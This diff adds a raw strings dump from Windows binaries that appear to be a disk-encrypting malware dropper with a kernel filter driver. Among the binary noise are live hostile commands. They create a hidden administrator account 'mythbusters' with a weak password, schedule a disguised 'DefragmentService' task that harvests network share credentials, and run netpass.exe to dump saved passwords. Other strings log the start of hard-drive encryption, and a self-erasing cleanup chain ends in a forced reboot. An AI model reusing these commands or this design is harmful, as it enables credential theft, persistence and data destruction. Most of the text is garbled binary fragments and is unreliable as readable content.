@@ -1,0 +1,2048 @@
+!This program cannot be run in DOS mode.
+?Rich:0
+`.rdata
+@.data
+@.reloc
+jjh ZB
+jkh<ZB
+D$(SVW
+|$0 s9Vj
+D$0SVW
+D$'9D$ 
+D$ SVW
+tb9u^j
+QQSVWd
+j0hHrB
+HtHu4j
+PP9E u
+PPPPPPPP
+jA[jZZ+
+j@j _W
+Genuu_
+ineIuV
+nteluM3
+<\u#j\W
+htHjlY;
+HHtXHHt
+nt'joY;
+YYjgXf9
+>0t<Nj0X
+j$h uB
+~pjCXf
+tyPVj@W
+_tcPVj@
+u#j,Xf;
+>Cu/f9F
+RVSQSWV
+<at-<rt"<wt
+URPQQh
+,SVWj0X
+Wj0XPV
+SVWjA_jZ+
+uBjAYjZ+
+~';_t|%3
+bWWWWj
+t VV9u
+;t$,v-
+UQPXY]Y[
+<0|o<9
+G Pj*S
+G$Pj+S
+G(Pj,S
+G,Pj-S
+G0Pj.S
+G4Pj/S
+G8PjDS
+G<PjES
+G@PjFS
+GDPjGS
+GHPjHS
+GLPjIS
+GPPjJS
+GTPjKS
+GXPjLS
+G\PjMS
+G`PjNS
+GdPjOS
+GhPj8S
+GlPj9S
+GpPj:S
+GtPj;S
+GxPj<S
+G|Pj=S
+Yu2Vj@h(IB
+SHPh(IB
+tHHt*Ht#
+SVjA[jZ^+
+jAZjZ^+
+Ht+Ht$Ht
+HtHHt
++tHHt
++t"HHt
+HAO8t
+u0h\WB
+u!hdWB
+uHjAXf;
+permission denied
+file exists
+no such device
+filename too long
+device or resource busy
+io error
+directory not empty
+invalid argument
+no space on device
+no such file or directory
+function not supported
+no lock available
+not enough memory
+resource unavailable try again
+cross device link
+operation canceled
+too many files open
+permission_denied
+address_in_use
+address_not_available
+address_family_not_supported
+connection_already_in_progress
+bad_file_descriptor
+connection_aborted
+connection_refused
+connection_reset
+destination_address_required
+bad_address
+host_unreachable
+operation_in_progress
+interrupted
+invalid_argument
+already_connected
+too_many_files_open
+message_size
+filename_too_long
+network_down
+network_reset
+network_unreachable
+no_buffer_space
+no_protocol_option
+not_connected
+not_a_socket
+operation_not_supported
+protocol_not_supported
+wrong_protocol_type
+timed_out
+operation_would_block
+address family not supported
+address in use
+address not available
+already connected
+argument list too long
+argument out of domain
+bad address
+bad file descriptor
+bad message
+broken pipe
+connection aborted
+connection already in progress
+connection refused
+connection reset
+destination address required
+executable format error
+file too large
+host unreachable
+identifier removed
+illegal byte sequence
+inappropriate io control operation
+invalid seek
+is a directory
+message size
+network down
+network reset
+network unreachable
+no buffer space
+no child process
+no link
+no message available
+no message
+no protocol option
+no stream resources
+no such device or address
+no such process
+not a directory
+not a socket
+not a stream
+not connected
+not supported
+operation in progress
+operation not permitted
+operation not supported
+operation would block
+owner dead
+protocol error
+protocol not supported
+read only file system
+resource deadlock would occur
+result out of range
+state not recoverable
+stream timeout
+text file busy
+timed out
+too many files open in system
+too many links
+too many symbolic link levels
+value too large
+wrong protocol type
+bad allocation
+0123456789abcdefghijklmnopqrstuvwxyz
+0123456789abcdefghijklmnopqrstuvwxyz
+0123456789abcdefABCDEF
+Unknown exception
+COMSPEC
+cmd.exe
+CorExitProcess
+bad exception
+ !"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\]^_`abcdefghijklmnopqrstuvwxyz{|}~
+ !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~
+FlsAlloc
+FlsFree
+FlsGetValue
+FlsSetValue
+InitializeCriticalSectionEx
+CreateSemaphoreExW
+SetThreadStackGuarantee
+CreateThreadpoolTimer
+SetThreadpoolTimer
+WaitForThreadpoolTimerCallbacks
+CloseThreadpoolTimer
+CreateThreadpoolWait
+SetThreadpoolWait
+CloseThreadpoolWait
+FlushProcessWriteBuffers
+FreeLibraryWhenCallbackReturns
+GetCurrentProcessorNumber
+GetLogicalProcessorInformation
+CreateSymbolicLinkW
+SetDefaultDllDirectories
+EnumSystemLocalesEx
+CompareStringEx
+GetDateFormatEx
+GetLocaleInfoEx
+GetTimeFormatEx
+GetUserDefaultLocaleName
+IsValidLocaleName
+LCMapStringEx
+GetCurrentPackageId
+ !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~
+UTF-16LE
+UNICODE
+Sunday
+Monday
+Tuesday
+Wednesday
+Thursday
+Friday
+Saturday
+January
+February
+August
+September
+October
+November
+December
+MM/dd/yy
+dddd, MMMM dd, yyyy
+HH:mm:ss
+_hypot
+_nextafter
+(null)
+`h````
+xpxxxx
+SunMonTueWedThuFriSat
+JanFebMarAprMayJunJulAugSepOctNovDec
+MessageBoxW
+GetActiveWindow
+GetLastActivePopup
+GetUserObjectInformationW
+GetProcessWindowStation
+SystemRoot
+__based(
+__cdecl
+__pascal
+__stdcall
+__thiscall
+__fastcall
+__clrcall
+__eabi
+__ptr64
+__restrict
+__unaligned
+restrict(
+ delete
+operator
+`vftable'
+`vbtable'
+`vcall'
+`typeof'
+`local static guard'
+`string'
+`vbase destructor'
+`vector deleting destructor'
+`default constructor closure'
+`scalar deleting destructor'
+`vector constructor iterator'
+`vector destructor iterator'
+`vector vbase constructor iterator'
+`virtual displacement map'
+`eh vector constructor iterator'
+`eh vector destructor iterator'
+`eh vector vbase constructor iterator'
+`copy constructor closure'
+`udt returning'
+`local vftable'
+`local vftable constructor closure'
+ new[]
+ delete[]
+`omni callsig'
+`placement delete closure'
+`placement delete[] closure'
+`managed vector constructor iterator'
+`managed vector destructor iterator'
+`eh vector copy constructor iterator'
+`eh vector vbase copy constructor iterator'
+`dynamic initializer for '
+`dynamic atexit destructor for '
+`vector copy constructor iterator'
+`vector vbase copy constructor iterator'
+`managed vector copy constructor iterator'
+`local static thread guard'
+ Type Descriptor'
+ Base Class Descriptor at (
+ Base Class Array'
+ Class Hierarchy Descriptor'
+ Complete Object Locator'
+CreateFile2
+`h`hhh
+xppwpp
+1#SNAN
+1#QNAN
+bad locale name
+generic
+unknown error
+iostream
+iostream stream error
+system
+ios_base::badbit set
+ios_base::failbit set
+ios_base::eofbit set
+C:\DC22\log_file.txt
+error in CreateFile....
+Wow64DisableWow64FsRedirection
+Kernel32.dll
+Checking resources existence. They are OK...
+copy resource file...
+driver installed before...
+installing driver...
+installing driver successfully..
+failed to copy file and exit..
+Password not set.exit
+C:\DC22\netpass.txt
+getting share drive information...
+schtasks /create /tn DefragmentService /TR "cmd.exe /c net use >> c:\dc22\netuse.txt" /sc DAILY
+schtasks /run /TN DefragmentService
+schtasks /delete /TN DefragmentService /F
+C:\DC22\netpass.exe  /stab C:\DC22\netpass.txt
+net user /add mythbusters 123456
+net localgroup administrators mythbusters /add
+cmd /c net use >> c:\dc22\netuse.txt
+Trying to create service...
+creating service successfully. rebooting windows...
+starting serviceMain...
+ServiceMain: Entry
+ServiceMain: RegisterServiceCtrlHandler returned error
+ServiceMain: SetServiceStatus returned error
+ ServiceMain: Performing Service Start Operations
+ServiceMain: CreateEvent(g_ServiceStopEvent) returned error
+ ServiceMain: SetServiceStatus returned error
+ServiceMain: Waiting for Worker Thread to complete
+ServiceMain: Worker Thread Stop Event signaled
+ServiceMain: Performing Cleanup Operations
+ServiceMain: Exit
+ServiceCtrlHandler: Entry
+ServiceCtrlHandler: SERVICE_CONTROL_STOP Request
+ServiceCtrlHandler: SetServiceStatus returned error
+ServiceCtrlHandler: Exit
+ServiceWorkerThread: Entry
+Starting Mount app...
+C:\DC22\Mount.exe
+LogonUserW_FAILURE
+PXERR_IMPERSONATION_FAILURE
+start hard drive encryption...
+time limit passed.doing clean-up and reboot...
+/C ping 1.1.1.1 -n 1 -w 3000 > Nul & sc delete DefragmentService & Del "
+ & taskkill /im Mount.exe & Del "C:\DC22\Mount.exe" & Del "C:\DC22\netpass.txt"  & Del "C:\DC22\netuse.txt"  & Del "C:\DC22\netpass.exe" & net user /del mythbusters
+ & shutdown /f /r /t 0
+string too long
+invalid string position
+bad cast
+PathFileExistsA
+PathFileExistsW
+SHLWAPI.dll
+GetCommandLineW
+GetNativeSystemInfo
+FindResourceW
+LoadResource
+GetCurrentProcess
+CreateDirectoryW
+WaitForSingleObject
+SetEvent
+GetModuleHandleW
+WriteFile
+GetSystemDirectoryW
+SizeofResource
+GetConsoleWindow
+GetVersionExW
+GetModuleFileNameW
+CreateFileW
+MultiByteToWideChar
+GetLastError
+GetProcAddress
+LockResource
+CreateEventW
+GetModuleFileNameA
+GetModuleHandleA
+CloseHandle
+CreateThread
+KERNEL32.dll
+ShowWindow
+ExitWindowsEx
+USER32.dll
+CreateServiceW
+OpenProcessToken
+OpenSCManagerW
+StartServiceCtrlDispatcherW
+LogonUserW
+CreateProcessAsUserW
+LookupPrivilegeValueW
+ChangeServiceConfig2W
+ImpersonateLoggedOnUser
+SetServiceStatus
+RevertToSelf
+RegisterServiceCtrlHandlerW
+AdjustTokenPrivileges
+ADVAPI32.dll
+ShellExecuteA
+ShellExecuteW
+SHELL32.dll
+InterlockedIncrement
+InterlockedDecrement
+EncodePointer
+DecodePointer
+EnterCriticalSection
+LeaveCriticalSection
+DeleteCriticalSection
+WideCharToMultiByte
+GetStringTypeW
+HeapFree
+HeapAlloc
+ExitProcess
+GetModuleHandleExW
+AreFileApisANSI
+GetCommandLineA
+RaiseException
+RtlUnwind
+InitializeCriticalSectionAndSpinCount
+GetCPInfo
+IsProcessorFeaturePresent
+UnhandledExceptionFilter
+SetUnhandledExceptionFilter
+SetLastError
+TerminateProcess
+TlsAlloc
+TlsGetValue
+TlsSetValue
+TlsFree
+GetStartupInfoW
+CompareStringW
+LCMapStringW
+GetLocaleInfoW
+IsValidLocale
+GetUserDefaultLCID
+EnumSystemLocalesW
+IsDebuggerPresent
+GetStdHandle
+GetFileType
+GetProcessHeap
+ReadFile
+SetFilePointerEx
+FlushFileBuffers
+GetConsoleCP
+GetConsoleMode
+HeapSize
+LoadLibraryExW
+IsValidCodePage
+GetACP
+GetOEMCP
+GetCurrentThreadId
+QueryPerformanceCounter
+GetCurrentProcessId
+GetSystemTimeAsFileTime
+GetEnvironmentStringsW
+FreeEnvironmentStringsW
+SetFilePointer
+HeapReAlloc
+OutputDebugStringW
+LoadLibraryW
+ReadConsoleW
+SetStdHandle
+WriteConsoleW
+GetExitCodeProcess
+CreateProcessA
+GetFileAttributesExW
+SetEnvironmentVariableA
+SetEndOfFile
+.?AV_Locimp@locale@std@@
+.?AVbad_alloc@std@@
+.?AVlogic_error@std@@
+.?AVlength_error@std@@
+.?AVout_of_range@std@@
+Copyright (c) 1992-2004 by P.J. Plauger, licensed by Dinkumware, Ltd. ALL RIGHTS RESERVED.
+.?AVtype_info@@
+.?AVbad_exception@std@@
+                          
+abcdefghijklmnopqrstuvwxyz
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+                          
+abcdefghijklmnopqrstuvwxyz
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+.?AVsystem_error@std@@
+.?AV?$codecvt@DDH@std@@
+.?AVbad_cast@std@@
+.?AVexception@std@@
+.?AVcodecvt_base@std@@
+.?AVios_base@std@@
+.?AV_Iostream_error_category@std@@
+.?AVfailure@ios_base@std@@
+.?AVruntime_error@std@@
+.?AV?$ctype@D@std@@
+.?AV_System_error_category@std@@
+.?AV?$basic_filebuf@DU?$char_traits@D@std@@@std@@
+.?AV?$basic_ios@DU?$char_traits@D@std@@@std@@
+.?AV?$_Iosb@H@std@@
+.?AVerror_category@std@@
+.?AV_Generic_error_category@std@@
+.?AV_Facet_base@std@@
+.?AUctype_base@std@@
+.?AV?$basic_ofstream@DU?$char_traits@D@std@@@std@@
+.?AV?$basic_ostream@DU?$char_traits@D@std@@@std@@
+.?AVfacet@locale@std@@
+.?AV?$basic_streambuf@DU?$char_traits@D@std@@@std@@
+!This program cannot be run in DOS mode.
+CU~`8U^
+CU~`.U[
+CURichY
+h.rdata
+H.data
+B.reloc
+SVWhDC_P
+hDC_Sh0i
+hDC_PS
+hDC_Sr
+hDC_Sh
+hDC_Sr
+QhPRCDh
+PhPRCDh
+WhDC_Sh@
+{@DCRPuq
+hDC_Sr
+hDC_PPj
+hDC_Sh0i
+hDC_PP
+hDC_PP
+QRWSP3
+L$$QVh
+D$ PSj
+T$DRVh
+T$ RSh(
+D$HPh(
+VPQjDh
+PQRVS3
+hDC_Sh0i
+hDC_Ph
+hDC_PP
+hDC_PP
+hDC_Pj(j
+hDC_PV
+u<hDC_Sh@
+hDC_Sh0i
+hDC_Sh0i
+G@DCRP
+hDC_Sh0i
+hDC_Sh0i
+L$TQj@
+Vhdc_3h(
+hDC_Sh0i
+@DCRPu
+hDC_Sh0i
+hDC_Pj(j
+^$hDC_PV
+hDC_Pj(j
+hDC_Pj(j
+hDC_PS
+VVVj j
+L$4QRP
+hDC_Pj(j
+hDC_PV
+hDC_PV
+hDC_Pj
+SVhDC_S
+hDC_Sr
+hDC_Pj
+hDC_PV
+hDC_PV
+hDC_Sh0i
+L$lQj@SR
+hDC_Sh@
+hDC_Sh0i
+hDC_Sh@
+hDC_Ph
+hDC_Sh0i
+L$<QVVVP
+C@DCRP
+hDC_PP
+hDC_PP
+QQQQh 
+hDC_PP
+hDC_Sr
+PQWVS3
+hDC_PP
+hDC_Sr
+hDC_PP
+hDC_Sr
+hDC_PP
+L$ QWW
+hDC_ShH
+hDC_Sr
+L$ QVV
+hDC_Sr
+hDC_Sh0i
+hDC_Sr
+hDC_Sr
+hDC_Sh0i
+hDC_Pj(j
+hDC_PW
+hDC_Sr
+hDC_PQ
+hDC_PS
+VhDC_Pj
+hDC_PS
+^hDC_PS
+WhDC_Pj
+SSSSh0
+VWhDC_Sh
+hdc_7R
+_[9F@v
+F(|{;F
+FHQRSSVh 
+~@WPQVh
+hdc_7Qj
+hdc_5h
+T$4RVh
+T$4QPj
+hDC_PWV
+hDC_PV
+hDC_PRV
+hDC_PV
+hDC_PV
+@(l>+
+~H9FHr
+3T$$3L$ 
+3L$ 3T$$
+T{{Ku%
+WSPQVR
+WSPQVV
+WSRPVV
+WSPQVR
+WSPQVV
+WSRPVV
+WSPQVR
+WSPQVV
+WSPQVR
+WSPQVV
+WSPQVR
+WSPQVV
+WSPQVR
+WSPQVV
+WSPQVR
+WSPQVV
+WSPQVR
+WSPQVV
+F(l>+
+F(l>+
+password
+L&&jl66Z~??A
+Oh44\Q
+sb11S*
+uB!!c 
+D""fT**~;
+;d22Vt::N
+J%%o\..r8
+gg}V++
+jL&&Zl66A~??
+Sb11?*
+tX,,.4
+RRMv;;a
+MMUf33
+PPDx<<
+cB!!0 
+~~Gz==
+fD""~T**
+Vd22Nt::
+xxoJ%%r\..$8
+tt!>
+ppB|>>
+aa_j55
+UUxP((z
+&jL&6Zl6?A~?
+~=Gz=d
+"fD"*~T*
+2Vd2:Nt:
+x%oJ%.r\.
+t!>K
+a5_j5W
+=&&jL66Zl??A~
+g99KrJJ
+==Gzdd
+""fD**~T
+22Vd::Nt
+$$lH\\
+77Ynmm
+%%oJ..r\
+!>KK
+55_jWW
+[T:$6.
+[.:$6g
+j_FbT~
+h4,8$@_
+2\tHlWB
+PQAeS~
+~4[C)v
+GG0<$$
+L_yyTAkk
+KKtiSS6
+LLlwAAB
+|c]]("66'
+rrplTT
+UUHZ~~O
+^^xfZZ\KeeXNbb
+IIhrFFDUww
+49##5b
+AAwl((
+]]c|hh;
+??-$vv
+TTlpss*
+eeK\++
+)iOO}d
+--3<yy_L
+bbNX__
+nllDP22]
+_yLyAkTk
+c]|]"6(6
+r;rlTpTL)
+^fZxZKe\eNbXbE
+IrFhFUwDw
+Sc|]c;
+',1'v%
+3<-3_Ly_
+2]rhFr&e
+D7q/;M
+Qkkbal
+dcrypt.pdb
+ExAllocatePoolWithTag
+ExFreePoolWithTag
+MmUnmapIoSpace
+MmMapIoSpace
+KeBugCheckEx
+_wcsicmp
+ExAcquireResourceExclusiveLite
+KeLeaveCriticalRegion
+KeEnterCriticalRegion
+ExAcquireResourceSharedLite
+ExReleaseResourceLite
+ObfReferenceObject
+ObfDereferenceObject
+ExInitializeResourceLite
+IoBuildDeviceIoControlRequest
+IoBuildSynchronousFsdRequest
+RtlInitUnicodeString
+KeInitializeEvent
+ZwCreateFile
+KeWaitForSingleObject
+IofCallDriver
+IoAcquireRemoveLockEx
+KeQueryActiveProcessors
+IoRegisterDriverReinitialization
+IoDeleteDevice
+IoGetDeviceObjectPointer
+ZwQueryValueKey
+PsTerminateSystemThread
+PoStartNextPowerIrp
+ZwClose
+PsGetVersion
+IoCreateSymbolicLink
+IoCreateDevice
+ZwOpenKey
+MmFreeContiguousMemory
+MmBuildMdlForNonPagedPool
+IoFreeMdl
+IoAllocateMdl
+MmAllocateContiguousMemory
+PsSetLoadImageNotifyRoutine
+_wcsnicmp
+KeBugCheck
+PoSetSystemState
+KeSetEvent
+ExfInterlockedInsertTailList
+ExfInterlockedRemoveHeadList
+KeReleaseMutex
+KeClearEvent
+ExInitializeNPagedLookasideList
+InterlockedPopEntrySList
+ZwWaitForSingleObject
+ExDeleteNPagedLookasideList
+InterlockedPushEntrySList
+IoGetRequestorProcess
+IoReleaseRemoveLockEx
+MmMapLockedPagesSpecifyCache
+PsGetProcessId
+memmove
+_vsnwprintf
+ObReferenceObjectByHandle
+MmIsAddressValid
+KeSaveFloatingPointState
+ZwQuerySymbolicLinkObject
+ZwOpenSymbolicLinkObject
+IoVolumeDeviceToDosName
+KeDelayExecutionThread
+ObQueryNameString
+PsCreateSystemThread
+KeRestoreFloatingPointState
+ExQueueWorkItem
+SeTokenIsAdmin
+PsReferencePrimaryToken
+IoGetCurrentProcess
+IofCompleteRequest
+PoCallDriver
+PsDereferencePrimaryToken
+MmUnmapLockedPages
+PsSetCreateProcessNotifyRoutine
+MmProbeAndLockPages
+IoAllocateIrp
+MmUnlockPages
+PsGetCurrentProcessId
+ZwFsControlFile
+IoGetLowerDeviceObject
+KeInitializeMutex
+IoAttachDeviceToDeviceStackSafe
+IoDetachDevice
+IoReleaseRemoveLockAndWaitEx
+IoGetAttachedDeviceReference
+IoInitializeRemoveLockEx
+wcsncmp
+ExUuidCreate
+IoGetStackLimits
+ExGetPreviousMode
+KeQueryInterruptTime
+KeQuerySystemTime
+IoWriteOperationCount
+MmQuerySystemSize
+KeGetCurrentThread
+IoWriteTransferCount
+RtlRandom
+IoReadOperationCount
+IoGetInitialStack
+KeTickCount
+IoGetTopLevelIrp
+IoReadTransferCount
+PsGetCurrentThreadId
+PsGetProcessExitTime
+KeQueryPriorityThread
+IoReuseIrp
+IoBuildPartialMdl
+IoFreeIrp
+ZwSetInformationFile
+ZwQueryVolumeInformationFile
+ZwReadFile
+ZwWriteFile
+ntoskrnl.exe
+KeQueryPerformanceCounter
+KeGetCurrentIrql
+KfRaiseIrql
+KfLowerIrql
+ExReleaseFastMutex
+ExAcquireFastMutex
+KeReleaseInStackQueuedSpinLock
+KeAcquireInStackQueuedSpinLock
+HAL.dll
+FltGetInstanceContext
+FltDeleteInstanceContext
+FltSetInstanceContext
+FltCreateFile
+FltReissueSynchronousIo
+FltQueryInformationFile
+FltReleaseContext
+FltClose
+FltAllocateContext
+FltUnregisterFilter
+FltGetVolumeName
+FltRegisterFilter
+FltStartFiltering
+FLTMGR.SYS
+memset
+_allmul
+_except_handler3
+memcpy
+_alldiv
+_aulldiv
+0)1D1_1y1
+3%303K3[3
+6'6;6G6{6
+7#737<7L7U7[7
+89%989S9
+:$:2:8:
+<><E<K<Q<W<`<}<
+5#6Q6\6q6
+7#71777E7t7
+7)8I8V8_8
+9D9T9s9y9
+:):7:D:L:
+;-;2;J;R;[;a;
+<0<6<?<W<`<f<
+==%=,=b=
+>(>/>6>=>L>W>
+><?L?Y?b?h?n?
+q0w0;1s1
+2%2-2=2
+3@3F3O3g3l3r3
+4W4]4f4~4
+5$5<5Q5\5b5y5
+6%6-646=6E6L6Y6a6h6u6}6
+7<7\7|7
+7 8'868M8Y8`8u8
+9 9$9}9
+<%<<<S<m<
+0T1X1\1`1d1
+4 4>4T4v4
+4)585C5L5U5j5
+7!71777=7w7
+808=8F8L8R8
+:#:2:8:
+:G;Y;l;
+>Y>_>d>j>y>
+2E2X2c2
+3)3/343:3?3
+4:4?4E4P4V4\4b4k4
+56>6D6K6Q6Z6_6e6l6r6
+=+=M=^=m=|=
+>8?<?@?D?H?L?P?T?X?\?`?d?h?l?p?t?
+0"1)1E1S1s1
+4 4$4(4,4
+:.:;:]:l:C;R;
+>*>9>a>h>
+0,1014181<1@1D1v1{1
+3"4I4v4
+8(878F8R8l8u8~8
+8,9E9^9m9
+:3:Y:t:
+:/;;;\;
+</<5<H<c<v<{<
+="=3=?=E=J=P=[=`=f=
+=1>;>E>Q>Y>a>g>
+?(?.?c?j?o?t?z?
+2U3[3`3f3u3{3
+5h5n5s5y5
+6W6?7Q7d7w7
+798n8w8
+:*;3;};
+1"1/1c1x1
+3<3c3~3
+3L4R4f4
+4>5E5K5Q5
+6.646H6c6
+;"<><R<u<
+<L=R=f=
+>K>R>n>
+?!?0???
+000=0F0
+021I1V1c1~1
+3P3W3}3
+8[9e9x9
+:7:B:M:X:c:n:y:
+; ;0;H;R;\;b;n;t;
+=!=0=6=<=B=s=|=
+1'162p3
+3<4J4b4
+525O5s5
+8898F8
+;#;);I;
+<E=k=y=
+#0U0l0z0
+141@1e1
+4<4b4!5
+=K>U>_>i>s>}>
+?&?0?:?D?N?X?o?y?
+00)0@0J0T0^0h0x0
+1%1/191I1S1]1g1
+2$2.282`2j2t2~2
+313;3E3O3Y3c3m3
+4 4*444>4U4_4i4s4}4
+5&505:5D5N5^5h5r5|5
+66/696C6M6u6
+7F7P7Z7d7n7x7
+8!8+858?8I8S8j8t8~8
+9$9;9E9O9Y9c9s9}9
+:%:/:9:C:M:e:o:y:
+;;7;A;K;U;_;o;y;
+<'<1<A<K<U<_<
+='=1=Y=c=m=w=
+>+>5>?>I>S>]>g>
+?%?/?9?Q?[?e?o?y?
+0#0-070A0K0[0e0o0y0
+1-171A1K1s1}1
+2E2O2Y2c2m2w2
+3!3+353?3I3S3k3u3
+4%4=4G4Q4[4e4u4
+5#5-575G5Q5[5e5
+X9h9o9v9
+:":4:B:
+=#=0===Q=[=h=u=
+> >*>7>D>Q>e>o>|>
+?%?/?<?I?V?j?t?
+0%090C0P0]0j0~0
+1*1>1H1U1b1o1
+2$212>2R2\2i2v2
+3 3'343H3R3^3e3r3
+44,4@4J4V4]4j4~4
+45=5J5T5^5r5|5
+6+6?6L6Y6f6m6
+7$7-7:7G7Y7b7r7~7
+8%80898N8W8d8q8
+919:9G9S9h9q9~9
+: :):6:C:Q:^:k:x:
+;.;7;D;T;
+<'<4<A<V<_<l<
+= =K=T=a=x=
+>(>1>B>S>`>i>v>
+? ?-?E?N?[?f?o?
+0)020?0L0a0j0w0
+1!1.1;1P1Y1f1s1
+2'202=2I2^2g2t2
+3)363H3Q3^3k3
+4'404=4M4r4{4
+5 5-5:5O5X5i5z5
+6>6G6T6o6x6
+7*777H7V7_7l7y7
+8$858B8K8X8e8z8
+9&9/9<9N9W9d9p9
+:!:(:::C:P:]:r:{:
+;#;0;<;Q;Z;j;w;
+<)<;<D<Q<^<t<}<
+='=4=Y=b=o=
+>/><>I>Z>h>q>~>
+>?(?9?J?T?]?j?w?
+0*030>0G0T0i0r0
+1"1/1<1C1U1^1k1x1
+2,252B2N2c2o2|2
+3!3*373D3Y3b3o3|3
+4 454>4K4X4}4
+5%525?5T5]5j5
+6!6J6S6`6q6{6
+7 7-7H7Q7\7e7r7
+8"868C8P8]8d8v8
+9'949A9V9_9l9x9
+8'929:9I9r9
+:W:_:g:u:
+00#02060<0@0U0Y0_0c0w0{0
+3-474z4
+405:5@5D5H5L5P5T5X5f:l:r:x:~:
+0 1$1,181P1T1X1\1`1d1h1l1p1t1x1|1
+2$2,20282
+4 4,404<4@4L4P4\4`4
+Western Cape1
+Durbanville1
+Thawte1
+Thawte Certification10
+Thawte Timestamping CA0
+121221000000Z
+201230235959Z0^1
+Symantec Corporation100.
+'Symantec Time Stamping Services CA - G20
+http://ocsp.thawte.com0
+.http://crl.thawte.com/ThawteTimestampingCA.crl0
+TimeStamp-2048-10
+Symantec Corporation100.
+'Symantec Time Stamping Services CA - G20
+121018000000Z
+201229235959Z0b1
+Symantec Corporation1402
++Symantec Time Stamping Services Signer - G40
+http://ts-ocsp.ws.symantec.com07
++http://ts-aia.ws.symantec.com/tss-ca-g2.cer0<
++http://ts-crl.ws.symantec.com/tss-ca-g2.crl0(
+TimeStamp-2048-20
+VeriSign, Inc.10
+VeriSign Trust Network1;09
+2Terms of use at https://www.verisign.com/rpa (c)101.0,
+%VeriSign Class 3 Code Signing 2010 CA0
+131122000000Z
+151203235959Z0
+Russia1
+Moscow1
+ReactOS Foundation1>0<
+5Digital ID Class 3 - Microsoft Software Validation v21
+ReactOS Foundation0
+/http://csc3-2010-crl.verisign.com/CSC3-2010.crl0D
+https://www.verisign.com/rpa0
+http://ocsp.verisign.com0;
+/http://csc3-2010-aia.verisign.com/CSC3-2010.cer0
+Washington1
+Redmond1
+Microsoft Corporation1)0'
+ Microsoft Code Verification Root0
+110222192517Z
+210222193517Z0
+VeriSign, Inc.10
+VeriSign Trust Network1:08
+1(c) 2006 VeriSign, Inc. - For authorized use only1E0C
+<VeriSign Class 3 Public Primary Certification Authority - G50
+Dhttp://crl.microsoft.com/pki/crl/products/MicrosoftCodeVerifRoot.crl0
+,N<jPl
+3BH8Q:|8
+VeriSign, Inc.10
+VeriSign Trust Network1:08
+1(c) 2006 VeriSign, Inc. - For authorized use only1E0C
+<VeriSign Class 3 Public Primary Certification Authority - G50
+100208000000Z
+200207235959Z0
+VeriSign, Inc.10
+VeriSign Trust Network1;09
+2Terms of use at https://www.verisign.com/rpa (c)101.0,
+%VeriSign Class 3 Code Signing 2010 CA0
+https://www.verisign.com/cps0*
+https://www.verisign.com/rpa0
+[0Y0W0U
+image/gif0!00
+#http://logo.verisign.com/vslogo.gif04
+#http://crl.verisign.com/pca3-g5.crl04
+http://ocsp.verisign.com0
+VeriSignMPKI-2-80
+VeriSign, Inc.10
+VeriSign Trust Network1;09
+2Terms of use at https://www.verisign.com/rpa (c)101.0,
+%VeriSign Class 3 Code Signing 2010 CA
++zT:,|
+Symantec Corporation100.
+'Symantec Time Stamping Services CA - G2
+140709064208Z0#
+!This program cannot be run in DOS mode.
+`.rdata
+@.data
+@.reloc
+URPQQh
+j\hh~A
+UQPXY]Y[
+\$$)\$()\$,
+T$(+T$ 
+j4h0OA
+T$<RW3
+D$,DbA
+D$8tbA
+T$`PQRV
+PQh@lA
+D$X$bA
+&&&&&&&&&&&
+&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+&&&&&&&&&&&&
+&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+ &&&&&&&&&&&&&&&&&&&&&&&&&&!"#$%W
+j4h0OA
+WVh\NA
+uBVh OA
+j4h0OA
+j4h0OA
+WPhhUA
+SPhhTA
+SVh8RA
+PWh,TA
+NAQhHMA
+QWWWWWW
+WSWPQh"
+D$$Ph^
++tHu5
+j4h0OA
+```hhh
+xppwpp
+1.1.846.118
+%d / %d
+ImageList_Draw
+ImageList_GetIconSize
+ImageList_DrawEx
+ImageList_Add
+ImageList_Create
+COMCTL32.dll
+PathFileExistsW
+SHLWAPI.dll
+NtQueryInformationProcess
+ntdll.dll
+CreateProcessW
+GetCurrentProcess
+WaitForSingleObject
+OpenProcess
+GetModuleFileNameW
+CloseHandle
+GetLogicalDrives
+SetVolumeMountPointW
+LeaveCriticalSection
+ReadFile
+CreateFileW
+EnterCriticalSection
+GetVolumeInformationW
+InitializeCriticalSection
+GlobalFindAtomW
+GetModuleHandleA
+GetFileSize
+ExitProcess
+DeleteVolumeMountPointW
+GetCurrentThreadId
+SetThreadPriority
+SuspendThread
+ResumeThread
+CreateThread
+GetSystemTimeAsFileTime
+FileTimeToSystemTime
+FindResourceW
+LoadResource
+SizeofResource
+LockResource
+LoadLibraryW
+KERNEL32.dll
+MoveWindow
+SendMessageW
+GetSystemMetrics
+ShowWindow
+SetWindowPos
+GetWindowLongW
+InvalidateRect
+GetClientRect
+GetWindowInfo
+GetParent
+GetWindowRect
+ScreenToClient
+EnableWindow
+GetSysColor
+GetDlgItem
+EnableMenuItem
+GetMenu
+SetWindowTextW
+MessageBoxW
+GetMenuItemCount
+GetWindowTextW
+IsWindowEnabled
+DialogBoxParamW
+RegisterHotKey
+UnregisterHotKey
+DispatchMessageW
+RegisterClassW
+CreateDialogParamW
+LoadIconW
+LoadAcceleratorsW
+TranslateMessage
+FindWindowW
+SetForegroundWindow
+DefDlgProcW
+KillTimer
+GetMessageW
+SetTimer
+DestroyAcceleratorTable
+TranslateAcceleratorW
+CallWindowProcW
+DestroyIcon
+IsWindowVisible
+EndDialog
+SetWindowLongW
+ReleaseDC
+LookupIconIdFromDirectoryEx
+SetFocus
+CreateIconFromResourceEx
+TrackMouseEvent
+SetCursor
+GetMessagePos
+DestroyMenu
+SetWindowTextA
+CreatePopupMenu
+AppendMenuW
+GetWindowTextA
+TrackPopupMenu
+SetMenuItemInfoW
+GetCursorPos
+GetFocus
+PostQuitMessage
+MapDialogRect
+GetNextDlgTabItem
+SetWindowsHookExW
+CallNextHookEx
+UnhookWindowsHookEx
+EnumChildWindows
+DestroyWindow
+ExitWindowsEx
+GetDialogBaseUnits
+DrawStateW
+DrawFocusRect
+DrawEdge
